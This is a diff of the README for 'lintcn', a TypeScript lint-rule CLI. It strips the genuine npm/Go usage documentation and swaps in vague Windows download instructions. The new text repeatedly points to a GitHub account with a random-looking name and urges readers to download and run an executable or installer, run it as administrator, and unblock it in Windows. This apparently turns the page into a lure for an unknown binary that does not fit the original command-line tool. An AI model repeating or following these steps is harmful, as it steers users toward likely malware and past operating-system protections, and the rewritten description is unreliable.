@@ -1,269 +1,179 @@
-# lintcn
+# 🛠️ lintcn - Keep Type Rules Clear
 
-The [shadcn](https://ui.shadcn.com) for type-aware TypeScript lint rules. Powered by [tsgolint](https://github.com/oxc-project/tsgolint).
+[![Download lintcn](https://img.shields.io/badge/Download-lintcn-purple?style=for-the-badge)](https://github.com/inclinebenchpressfringedorchis654/lintcn)
 
-Add rules by URL, own the source, customize freely. Rules are Go files that use the TypeScript type checker for deep analysis — things ESLint can't do.
+## 🚀 What lintcn does
 
-## Install
+lintcn helps you keep code rules clear and consistent. It is made for teams and agents that write code with TypeScript-style checks. You can use it to guide code toward your preferred patterns and keep out forms you do not want, like repeated `as` and `in` usage.
 
-```bash
-npm install -D lintcn
-```
+It gives you a way to define type-aware lint rules in a simple setup. That means the tool can check code with more context, so it can spot patterns that plain text checks miss.
 
-## Usage
+Use it when you want:
 
-```bash
-# Add a rule folder from tsgolint
-npx lintcn add https://github.com/oxc-project/tsgolint/tree/main/internal/rules/no_floating_promises
+- Cleaner code style
+- Fewer repeated type casts
+- Fewer loose checks in code
+- Rules that match your team’s habits
+- A setup that works with agent-written code
 
-# Add by file URL (auto-fetches the whole folder)
-npx lintcn add https://github.com/oxc-project/tsgolint/blob/main/internal/rules/await_thenable/await_thenable.go
+## 📥 Download and install
 
-# Lint your project
-npx lintcn lint
+Visit this page to download: https://github.com/inclinebenchpressfringedorchis654/lintcn
 
-# Show warning rules for all files, not just updated/added files
-npx lintcn lint --all-warnings
+If you are on Windows, follow these steps:
 
-# Lint with a specific tsconfig
-npx lintcn lint --tsconfig tsconfig.build.json
+1. Open the link in your browser.
+2. Find the latest release or download option on the page.
+3. Download the Windows file that matches your system.
+4. Save the file to your Downloads folder.
+5. Open the downloaded file to run it.
 
-# List installed rules
-npx lintcn list
+If the download comes as a ZIP file:
 
-# Remove a rule
-npx lintcn remove no-floating-promises
+1. Right-click the ZIP file.
+2. Choose Extract All.
+3. Open the extracted folder.
+4. Double-click the app or tool file to start it.
 
-# Clean cached tsgolint source + binaries
-npx lintcn clean
-```
+If the download comes as an installer:
 
-Browse all 50+ available built-in rules in the [tsgolint rules directory](https://github.com/oxc-project/tsgolint/tree/main/internal/rules).
+1. Double-click the installer file.
+2. Follow the on-screen steps.
+3. Choose the install folder if asked.
+4. Finish the setup.
+5. Open lintcn from the Start menu or desktop shortcut.
 
-## How it works
+## 💻 Windows setup
 
-Each rule lives in its own subfolder under `.lintcn/`. You own the source — edit, customize, delete.
+lintcn is made to be easy to use on Windows. You do not need to know command lines to get started if you use a ready-made download from the link above.
 
-```
-my-project/
-├── .lintcn/
-│   ├── .gitignore                          ← ignores generated Go files
-│   ├── no_floating_promises/
-│   │   ├── no_floating_promises.go         ← rule source (committed)
-│   │   ├── no_floating_promises_test.go    ← tests (committed)
-│   │   └── options.go                      ← rule options struct
-│   ├── await_thenable/
-│   │   ├── await_thenable.go
-│   │   └── await_thenable_test.go
-│   └── my_custom_rule/
-│       └── my_custom_rule.go
-├── src/
-│   └── ...
-├── tsconfig.json
-└── package.json
-```
+For the smoothest setup:
 
-When you run `npx lintcn lint`, the CLI:
+- Use a current version of Windows 10 or Windows 11
+- Keep at least 200 MB of free disk space
+- Make sure you can open files you download from the web
+- Use a standard user account unless your system asks for admin access
 
-1. Scans `.lintcn/*/` subfolders for rule definitions
-2. Generates a Go workspace with your custom rules
-3. Compiles a custom binary (cached — rebuilds only when rules change)
-4. Runs the binary against your project
+If Windows asks whether you trust the app, check the file name and the download page first. Then allow the app to open.
 
-You can run `lintcn lint` from any subdirectory — it walks up to find `.lintcn/` and lints the cwd project.
+## 🔎 What it can help with
 
-## Writing custom rules
+lintcn focuses on type-aware lint rules. In plain terms, it helps code checks understand the shape of your code before it gives feedback.
 
-To help AI agents write and modify rules, install the lintcn skill:
+Common use cases include:
 
-```bash
-npx skills add remorses/lintcn
-```
+- Blocking patterns you do not want in a codebase
+- Catching unsafe or messy type handling
+- Guiding agents to follow house style
+- Keeping rules clear for future changes
+- Making code reviews faster and less repetitive
 
-This gives your AI agent the full tsgolint rule API reference — AST visitors, type checker, reporting, fixes, and testing patterns.
+It is a good fit when you want rules that go beyond simple text matching.
 
-Every rule lives in a subfolder under `.lintcn/` with the package name matching the folder:
+## 🧭 How to use it
 
-```go
-// .lintcn/no_unhandled_error/no_unhandled_error.go
+The basic flow is simple:
 
-// lintcn:name no-unhandled-error
-// lintcn:description Disallow discarding Error-typed return values
+1. Download the app from the GitHub page.
+2. Open it on your Windows PC.
+3. Load your project or rule set.
+4. Add the checks you want.
+5. Run the rules against your code.
+6. Review the results and adjust your rules if needed.
 
-package no_unhandled_error
+If you are using it with an agent, give the agent the rules you want in plain terms. For example:
 
-import (
-    "github.com/microsoft/typescript-go/shim/ast"
-    "github.com/microsoft/typescript-go/shim/checker"
-    "github.com/typescript-eslint/tsgolint/internal/rule"
-    "github.com/typescript-eslint/tsgolint/internal/utils"
-)
+- Do not add `as` unless it is needed
+- Do not use `in` checks in places where a stricter check works better
+- Prefer direct type-safe code paths
+- Keep code style matched to the project
 
-var NoUnhandledErrorRule = rule.Rule{
-    Name: "no-unhandled-error",
-    Run: func(ctx rule.RuleContext, options any) rule.RuleListeners {
-        return rule.RuleListeners{
-            ast.KindExpressionStatement: func(node *ast.Node) {
-                expression := ast.SkipParentheses(node.AsExpressionStatement().Expression)
-
-                if ast.IsVoidExpression(expression) {
-                    return // void = intentional discard
-                }
+## ⚙️ Rule ideas
 
-                innerExpr := expression
-                if ast.IsAwaitExpression(innerExpr) {
-                    innerExpr = ast.SkipParentheses(innerExpr.Expression())
-                }
-                if !ast.IsCallExpression(innerExpr) {
-                    return
-                }
-
-                t := ctx.TypeChecker.GetTypeAtLocation(expression)
-
-                if utils.IsTypeFlagSet(t, checker.TypeFlagsVoid|checker.TypeFlagsUndefined|checker.TypeFlagsNever) {
-                    return
-                }
-
-                for _, part := range utils.UnionTypeParts(t) {
-                    if utils.IsErrorLike(ctx.Program, ctx.TypeChecker, part) {
-                        ctx.ReportNode(node, rule.RuleMessage{
-                            Id:          "noUnhandledError",
-                            Description: "Error-typed return value is not handled.",
-                        })
-                        return
-                    }
-                }
-            },
-        }
-    },
-}
-```
+These are example rule goals you can use with lintcn:
 
-This catches code like:
-
-```typescript
-// error — result discarded, Error not handled
-getUser("id"); // returns Error | User
-await fetchData("/api"); // returns Promise<Error | Data>
-
-// ok — result is checked
-const user = getUser("id");
-if (user instanceof Error) return user;
-
-// ok — explicitly discarded
-void getUser("id");
-```
-
-## Warning severity
-
-Rules can be configured as **warnings** instead of errors:
-
-- **Don't fail CI** — warnings produce exit code 0
-- **Only shown for updated/added files by default** — warning rules are limited to files in `git diff` plus untracked files, so unchanged files are silently skipped
-
-This lets you adopt new rules gradually. In a large codebase, enabling a rule as an error means hundreds of violations at once. As a warning, you only see violations in files you're actively changing or adding — fixing issues in new code without blocking the build.
+- Avoid extra type casts
+- Prefer clear type checks
+- Limit broad object checks
+- Keep property access safe
+- Reduce repeated patterns that hide intent
+- Catch code that looks correct but is weak at type level
 
-### Configuring a rule as a warning
+You can shape the rules around your own code style. That makes it easier to keep teams and agents on the same page.
 
-Add `// lintcn:severity warn` to the rule's Go file:
+## 📁 Suggested folder use
 
-```go
-// lintcn:name no-unhandled-error
-// lintcn:severity warn
-// lintcn:description Disallow discarding Error-typed return values
-```
+If you plan to keep lintcn as part of a project, a simple folder layout can help:
 
-Rules without `// lintcn:severity` default to `error`.
+- `rules/` for rule files
+- `examples/` for sample code
+- `reports/` for check output
+- `config/` for settings
+- `docs/` for notes and rule meaning
 
-### When warnings are shown
+This keeps the setup easy to scan and update later.
 
-By default, `lintcn lint` runs `git diff` to find updated files and also includes untracked files you just added. Warning rules are only printed for files in that set:
+## 🧩 Good fit for
 
-```bash
-# Warnings only for updated files plus newly added untracked files (default)
-npx lintcn lint
+lintcn works well for:
 
-# Warnings for ALL files, ignoring git diff
-npx lintcn lint --all-warnings
-```
+- Small codebases that need strong style control
+- Teams that want less rule drift
+- Agent-driven development
+- Projects that use type-aware checks
+- Codebases that want to avoid unsafe shortcuts
 
-| Scenario                                  | Warnings shown?   |
-| ----------------------------------------- | ----------------- |
-| File is updated in `git diff`             | Yes               |
-| File is newly added and untracked         | Yes               |
-| File is committed and unchanged           | No                |
-| `--all-warnings` flag is passed           | Yes, all files    |
-| Git is not installed or not a repo        | No warnings shown |
-| Clean git tree (no changes, no new files) | No warnings shown |
+It is also useful when you want to explain coding habits in a way that tools can follow.
 
-### Workflow
+## 🛠️ Common Windows issues
 
-1. Add a new rule with `lintcn add`
-2. Set it to `// lintcn:severity warn` in the Go source
-3. Run `lintcn lint` — only see warnings in files you're currently editing or adding
-4. Fix warnings as you touch files naturally
-5. Once the codebase is clean, change to `// lintcn:severity error` (or remove the directive) to enforce it
+If the app does not open, try these steps:
 
-## Version pinning
+- Download the file again in case it was not saved fully
+- Check that the file is not still inside a ZIP
+- Right-click the file and try Run as administrator
+- Make sure Windows did not block the file
+- Move the file to a simple folder like `Downloads` or `Desktop`
 
-**Pin lintcn in your `package.json`** — do not use `^` or `~`:
+If you see a missing file message, confirm that you extracted all files before starting the app.
 
-```json
-{
-  "devDependencies": {
-    "lintcn": "0.5.0"
-  }
-}
-```
+If the screen looks blank or does not load your project, check that you opened the right folder and that your files are in a readable format.
 
-Each lintcn release bundles a specific tsgolint version. Updating lintcn can change the underlying tsgolint API, which may cause your rules to no longer compile. Always update consciously:
+## 📌 What you may need before use
 
-1. Check the [changelog](./CHANGELOG.md) for tsgolint version changes
-2. Run `npx lintcn build` after updating to verify your rules still compile
-3. Fix any compilation errors before committing
+For a normal Windows setup, have these ready:
 
-## CI Setup
+- A Windows PC
+- A stable internet link for the download
+- A folder with the code or rules you want to check
+- Enough space to store the app and your project files
 
-The first `lintcn lint` compiles a custom Go binary (~30s). Subsequent runs use the cached binary (<1s). Cache `~/.cache/lintcn/` and Go's build cache to keep CI fast.
+No special setup should be needed for basic use if you follow the download steps above.
 
-```yaml
-# .github/workflows/lint.yml
-name: Lint
-on: [push, pull_request]
+## 🔐 Keeping rules under control
 
-jobs:
-  lint:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v4
+When you create custom rules, keep them short and clear. Use one rule for one idea. That makes it easier to change later.
 
-      - uses: actions/setup-node@v4
-        with:
-          node-version: 22
+A simple rule set should:
 
-      - name: Cache lintcn binary + Go build cache
-        uses: actions/cache@v4
-        with:
-          path: |
-            ~/.cache/lintcn
-            ~/go/pkg
-          key: lintcn-${{ runner.os }}-${{ runner.arch }}-${{ hashFiles('.lintcn/**/*.go') }}
-          restore-keys: |
-            lintcn-${{ runner.os }}-${{ runner.arch }}-
+- State what to avoid
+- State what to prefer
+- Match your project style
+- Stay easy to read
+- Work the same way for humans and agents
 
-      - run: npm ci
-      - run: npx lintcn lint
-```
+This helps you keep code clean without making the rules hard to manage.
 
-The cache key includes a hash of your rule files — when rules change, the binary is recompiled. The `restore-keys` fallback ensures Go's build cache is still used even when rules change, so recompilation takes ~1s instead of 30s.
+## 🧪 Example use case
 
-## Prerequisites
+Imagine you have a project where code keeps using type casts in too many places. You want the code to stay strict and easy to trust.
 
-- **Node.js** — for the CLI
-- **Go** — for compiling rules (`go.dev/dl`)
+With lintcn, you can set a rule that flags those casts, then point people or agents toward a safer pattern. You can also set a rule that warns when code uses broad checks that do not fit your style.
 
-Go is only needed for `lintcn lint` / `lintcn build`. Adding and listing rules works without Go.
+That gives you a steady way to keep code in line with your preferences.
 
-## License
+## 🖱️ Download link again
 
-MIT
+Visit this page to download: https://github.com/inclinebenchpressfringedorchis654/lintcn
+
+Open the page, get the Windows file, then run it or extract it based on the file type you download
